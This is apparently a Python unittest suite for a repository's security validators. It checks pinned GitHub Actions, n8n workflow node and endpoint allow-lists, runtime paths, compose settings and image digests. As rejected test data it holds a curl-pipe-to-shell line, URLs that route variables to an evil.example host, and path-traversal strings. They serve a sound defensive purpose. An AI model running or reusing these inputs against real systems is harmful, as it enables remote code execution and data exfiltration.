from __future__ import annotations

import copy
import json
import re
import unittest
from pathlib import Path

from scripts import validate_repository
from scripts import validate_workflows
from scripts import verify_release_manifest
from scripts import verify_runtime_paths

ROOT = Path(__file__).resolve().parents[1]


class ActionPolicyTests(unittest.TestCase):
    def test_only_reviewed_checkout_sha_is_allowed(self) -> None:
        self.assertIsNone(
            validate_repository.validate_action_reference(
                "actions/checkout", "fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09"
            )
        )

    def test_mutable_or_unreviewed_actions_are_rejected(self) -> None:
        self.assertIsNotNone(validate_repository.validate_action_reference("actions/checkout", "v5"))
        self.assertIsNotNone(
            validate_repository.validate_action_reference(
                "actions/checkout", "11d5960a326750d5838078e36cf38b85af677262"
            )
        )
        self.assertIsNotNone(
            validate_repository.validate_action_reference(
                "third-party/deploy", "1111111111111111111111111111111111111111"
            )
        )

    def test_write_all_and_network_download_patterns_are_blocked(self) -> None:
        sample = "permissions: write-all\nrun: curl https://example.invalid/script | sh\n"
        labels = {
            label
            for pattern, label in validate_repository.BANNED_WORKFLOW_PATTERNS.items()
            if re.search(pattern, sample.lower(), flags=re.MULTILINE)
        }
        self.assertIn("write-all GitHub token permission", labels)
        self.assertIn("network download command", labels)

    def test_commented_write_scope_and_multiline_self_hosted_are_blocked(self) -> None:
        sample = (
            "permissions:\n"
            "  issues: \"write\" # attempted bypass\n"
            "runs-on:\n"
            "  - self-hosted # attempted bypass\n"
        )
        labels = {
            label
            for pattern, label in validate_repository.BANNED_WORKFLOW_PATTERNS.items()
            if re.search(pattern, sample.lower(), flags=re.MULTILINE)
        }
        self.assertIn("write-scoped GitHub token permission", labels)
        self.assertIn("self-hosted runner access", labels)


class N8nPolicyTests(unittest.TestCase):
    def setUp(self) -> None:
        self.policy = json.loads((ROOT / "config" / "n8n-policy.json").read_text())

    def test_committed_unverified_policy_is_internally_consistent(self) -> None:
        errors, excluded = validate_repository.validate_n8n_policy(self.policy)
        self.assertEqual([], errors)
        self.assertIn("n8n-nodes-base.code", excluded)

    def test_required_dangerous_node_cannot_be_removed(self) -> None:
        policy = copy.deepcopy(self.policy)
        policy["security"]["dangerous_nodes_excluded"].remove("n8n-nodes-base.code")
        errors, _ = validate_repository.validate_n8n_policy(policy)
        self.assertTrue(any("dangerous-node policy misses" in error for error in errors))

    def test_unverified_policy_cannot_claim_endpoint_credentials_or_editor(self) -> None:
        policy = copy.deepcopy(self.policy)
        policy["endpoint_binding"]["production_strategy"] = "verified-fixed-private-dns"
        policy["credential_binding"]["approved_names"] = ["Codestra Middleware"]
        policy["editor_access"]["strategy"] = "verified-private-admin-network"
        errors, _ = validate_repository.validate_n8n_policy(policy)
        self.assertTrue(any("production_strategy" in error for error in errors))
        self.assertTrue(any("approve credential names" in error for error in errors))
        self.assertTrue(any("unverified editor access" in error for error in errors))

    def test_editor_must_not_be_directly_public(self) -> None:
        policy = copy.deepcopy(self.policy)
        policy["editor_access"]["publicly_routable"] = True
        errors, _ = validate_repository.validate_n8n_policy(policy)
        self.assertTrue(any("directly publicly routable" in error for error in errors))

    def test_approved_base_must_be_https_dns_without_userinfo_or_ip(self) -> None:
        self.assertTrue(validate_repository.valid_https_base("https://middleware.internal/api"))
        self.assertFalse(validate_repository.valid_https_base("http://middleware.internal/api"))
        self.assertFalse(validate_repository.valid_https_base("https://user@middleware.internal/api"))
        self.assertFalse(validate_repository.valid_https_base("https://10.40.0.1/api"))
        self.assertFalse(validate_repository.valid_https_base("https://middleware.invalid"))
        self.assertFalse(validate_repository.valid_https_base("HTTPS://MIDDLEWARE.INVALID"))
        self.assertFalse(validate_repository.valid_https_base("https://middleware.example"))


class WorkflowEndpointPolicyTests(unittest.TestCase):
    def setUp(self) -> None:
        self.policy = {
            "status": "UNVERIFIED",
            "endpoint_binding": {
                "status": "UNVERIFIED",
                "template_base_url": "https://middleware.invalid",
                "production_strategy": None,
            },
            "credential_binding": {"status": "UNVERIFIED"},
        }

    def test_template_can_only_use_reserved_invalid_origin(self) -> None:
        self.assertTrue(
            validate_workflows.allowed_http_target(
                "https://middleware.invalid/v2/automation/commands",
                is_template=True,
                policy=self.policy,
            )
        )
        for bad in (
            "https://api.example.com/v1/commands/test",
            "https://middleware.invalid.evil.example/v1/commands/test",
            "https://middleware.invalid@evil.example/v1/commands/test",
            "https://middleware.invalid/internal/v1/automation/commands",
            "https://middleware.invalid/v1/commands/test",
            "https://middleware.invalid/admin",
            "https://middleware.invalid/v1/../admin",
            "https://middleware.invalid/v1/%2e%2e/admin",
        ):
            self.assertFalse(
                validate_workflows.allowed_http_target(bad, is_template=True, policy=self.policy)
            )

    def test_environment_variable_and_custom_variable_exfiltration_are_rejected(self) -> None:
        self.assertFalse(
            validate_workflows.allowed_http_target(
                "={{$env.MIDDLEWARE_BASE_URL}}/v1/commands/test",
                is_template=False,
                policy=self.policy,
            )
        )
        verified = {
            "endpoint_binding": {
                "status": "VERIFIED",
                "production_strategy": "verified-custom-variable",
            }
        }
        for bad in (
            "https://evil.example/?target={{$vars.MIDDLEWARE_BASE_URL}}",
            "={{$vars.MIDDLEWARE_BASE_URL}}/https://evil.example",
            "={{$vars.MIDDLEWARE_BASE_URL}}/v1/../admin",
            "={{$vars.MIDDLEWARE_BASE_URL}}/v1/%2e%2e/admin",
            "={{$vars.MIDDLEWARE_BASE_URL}}/v1/%252e%252e/admin",
            "={{$vars.MIDDLEWARE_BASE_URL}}/v1/{{$json.path}}",
            "={{$vars.MIDDLEWARE_BASE_URL}}/v1/test?next=https://evil.example",
        ):
            self.assertFalse(
                validate_workflows.allowed_http_target(
                    bad,
                    is_template=False,
                    policy=verified,
                )
            )

    def test_verified_custom_variable_strategy_is_exact(self) -> None:
        policy = {
            "endpoint_binding": {
                "status": "VERIFIED",
                "production_strategy": "verified-custom-variable",
            }
        }
        self.assertTrue(
            validate_workflows.allowed_http_target(
                "={{$vars.MIDDLEWARE_BASE_URL}}/v2/automation/commands",
                is_template=False,
                policy=policy,
            )
        )

    def test_verified_fixed_base_requires_exact_origin_and_canonical_path(self) -> None:
        policy = {
            "endpoint_binding": {
                "status": "VERIFIED",
                "production_strategy": "verified-fixed-private-dns",
                "approved_base_url": "https://middleware.internal/api",
            }
        }
        self.assertTrue(
            validate_workflows.allowed_http_target(
                "https://middleware.internal/api/v2/automation/commands",
                is_template=False,
                policy=policy,
            )
        )
        for bad in (
            "https://middleware.internal/v1/commands/test",
            "https://middleware.internal.evil/api/v1/commands/test",
            "https://middleware.internal/api/../admin",
            "https://middleware.internal/api/%2e%2e/admin",
            "https://middleware.internal/api/%252e%252e/admin",
            "https://middleware.internal/api//v1/commands/test",
            "https://middleware.internal/api/v1/{{$json.path}}",
        ):
            self.assertFalse(
                validate_workflows.allowed_http_target(
                    bad,
                    is_template=False,
                    policy=policy,
                )
            )

    def test_node_types_are_default_denied(self) -> None:
        self.assertTrue(validate_workflows.node_type_allowed("n8n-nodes-base.set"))
        self.assertTrue(validate_workflows.node_type_allowed("n8n-nodes-base.httpRequest"))
        self.assertFalse(validate_workflows.node_type_allowed("n8n-nodes-base.rssFeedRead"))
        self.assertFalse(validate_workflows.node_type_allowed("community.providerNode"))

    def test_direct_service_detection_does_not_block_normal_postal_fields(self) -> None:
        self.assertFalse(validate_workflows.contains_direct_service_reference("postal_code"))
        self.assertTrue(
            validate_workflows.contains_direct_service_reference(
                "https://postal.internal/v1/messages"
            )
        )
        self.assertTrue(
            validate_workflows.contains_direct_service_reference(
                "postgresql://database.internal/n8n"
            )
        )

    def test_credential_references_require_exact_approved_type_and_name(self) -> None:
        policy = {
            "credential_binding": {
                "status": "VERIFIED",
                "approved_types": ["httpHeaderAuth"],
                "approved_names": ["Codestra Middleware"],
            }
        }
        approved = {
            "httpHeaderAuth": {
                "id": "cred_01",
                "name": "Codestra Middleware",
            }
        }
        self.assertTrue(validate_workflows.credential_references_allowed(approved, policy))
        rejected = copy.deepcopy(approved)
        rejected["httpHeaderAuth"]["secret"] = "not-allowed"
        self.assertFalse(validate_workflows.credential_references_allowed(rejected, policy))
        rejected = copy.deepcopy(approved)
        rejected["httpHeaderAuth"]["name"] = "Different Credential"
        self.assertFalse(validate_workflows.credential_references_allowed(rejected, policy))


class RuntimePathPolicyTests(unittest.TestCase):
    def test_filesystem_paths_must_be_absolute_and_canonical(self) -> None:
        self.assertTrue(verify_runtime_paths.valid_expected("file", "/opt/n8n/compose.yml"))
        self.assertFalse(verify_runtime_paths.valid_expected("file", "compose.yml"))
        self.assertFalse(verify_runtime_paths.valid_expected("file", "/opt/n8n/../secret"))
        self.assertFalse(verify_runtime_paths.valid_expected("file", "/opt//n8n/compose.yml"))

    def test_volume_secret_and_object_store_references_can_be_identifiers(self) -> None:
        self.assertTrue(
            verify_runtime_paths.valid_expected("directory-or-volume", "codestra_n8n_data")
        )
        self.assertTrue(
            verify_runtime_paths.valid_expected(
                "secret-provider-reference", "docker-secret:n8n-encryption-key"
            )
        )
        self.assertTrue(
            verify_runtime_paths.valid_expected(
                "directory-or-object-store", "s3://codestra-backups/n8n"
            )
        )

    def test_claimed_verified_state_is_fully_checked_even_in_allow_mode(self) -> None:
        data = json.loads((ROOT / "config" / "runtime-paths.json").read_text())
        data["status"] = "VERIFIED"
        errors = verify_runtime_paths.validate(data, require_verified=False)
        self.assertTrue(any("verified_at" in error for error in errors))
        self.assertTrue(any("required path" in error for error in errors))


class ComposePolicyTests(unittest.TestCase):
    def test_main_and_worker_readiness_probes_are_fail_closed(self) -> None:
        compose = (ROOT / "deploy" / "compose" / "compose.staging.yml").read_text(
            encoding="utf-8"
        )
        self.assertIn('QUEUE_HEALTH_CHECK_ACTIVE: "true"', compose)
        self.assertIn('QUEUE_HEALTH_CHECK_PORT: "5680"', compose)
        self.assertIn("http://127.0.0.1:5678/healthz/readiness", compose)
        self.assertIn("http://127.0.0.1:5680/healthz/readiness", compose)
        self.assertNotRegex(compose, r"(?m)^\s*ports:\s*$")

    def test_compose_excludes_high_risk_nodes_and_mutable_builds(self) -> None:
        compose = (ROOT / "deploy" / "compose" / "compose.staging.yml").read_text()
        for node in validate_repository.REQUIRED_DANGEROUS_NODES:
            self.assertIn(node, compose)
        self.assertNotRegex(compose, r"(?m)^\s*build:\s*")
        self.assertNotRegex(compose, r"(?i)image:[^\n]+:latest(?:\s|$)")

    def test_runtime_node_exclusions_match_export_forbidden_nodes(self) -> None:
        policy = json.loads((ROOT / "config" / "n8n-policy.json").read_text())
        excluded = {node.lower() for node in policy["security"]["dangerous_nodes_excluded"]}
        self.assertFalse(validate_workflows.FORBIDDEN_NODE_TYPES - excluded)


class ReleasePolicyTests(unittest.TestCase):
    def test_placeholder_unapproved_or_malformed_images_are_rejected(self) -> None:
        bad = (
            "ghcr.io/appolon1908-hue/n8n@sha256:" + ("0" * 64),
            "docker.io/library/n8n@sha256:" + ("1" * 64),
            "ghcr.io/appolon1908-hue/../evil@sha256:" + ("1" * 64),
            "ghcr.io/Appolon1908-hue/n8n@sha256:" + ("1" * 64),
        )
        for image in bad:
            self.assertFalse(verify_release_manifest.valid_image_reference(image))

    def test_approved_non_placeholder_image_is_accepted(self) -> None:
        self.assertTrue(
            verify_release_manifest.valid_image_reference(
                "ghcr.io/appolon1908-hue/automation/n8n@sha256:" + ("1" * 64)
            )
        )

    def test_same_digest_is_same_artifact_even_under_another_approved_name(self) -> None:
        first = "ghcr.io/appolon1908-hue/n8n@sha256:" + ("1" * 64)
        second = "ghcr.io/codestra/n8n-rollback@sha256:" + ("1" * 64)
        self.assertEqual(
            verify_release_manifest.image_digest(first),
            verify_release_manifest.image_digest(second),
        )


if __name__ == "__main__":
    unittest.main()
